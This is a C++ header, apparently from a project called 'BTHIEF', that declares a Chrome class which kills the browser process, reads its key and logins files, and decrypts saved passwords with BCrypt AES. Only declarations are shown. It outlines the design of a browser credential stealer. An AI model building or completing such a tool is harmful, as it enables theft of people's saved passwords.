#ifndef BTHIEF_BROWSERS_CHROME_CHROME_HXX
#define BTHIEF_BROWSERS_CHROME_CHROME_HXX

#include "browsers/browser.hxx"
#include <expected>
#include <filesystem>
#include <string>
#include <windows.h>
#include <bcrypt.h>
#include <wil/resource.h>

class chrome : public browser {
public:
    static std::unique_ptr<chrome> construct(std::string proc_name, std::filesystem::path path);

    chrome() = delete;
    std::expected<std::vector<login>, browser_error> get_logins(void) override;

private:
    std::string m_proc_name;
    std::filesystem::path m_key_path, m_logins_path;
    wil::unique_bcrypt_algorithm m_aes_alg;

    chrome(std::string, std::filesystem::path, std::filesystem::path);
    std::string decrypt_password(std::vector<uint8_t> db_password, const BCRYPT_KEY_HANDLE key);
    void kill(void);
};

#endif // ifndef BTHIEF_BROWSERS_CHROME_CHROME_HXX
